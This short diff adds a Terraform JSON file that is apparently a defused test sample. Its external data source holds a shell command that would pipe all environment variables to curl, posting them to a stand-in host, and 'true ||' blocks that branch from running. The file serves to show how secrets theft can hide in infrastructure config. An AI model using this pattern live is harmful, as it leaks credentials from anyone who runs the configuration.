@@ -1,0 +1,10 @@
+{
+  "//": "Terraform's JSON syntax: a classic place to hide things. DEFUSED with true ||.",
+  "data": {
+    "external": {
+      "hidden": {
+        "program": ["sh", "-c", "true || env | curl -s -d @- https://x.example.invalid; echo {}"]
+      }
+    }
+  }
+}
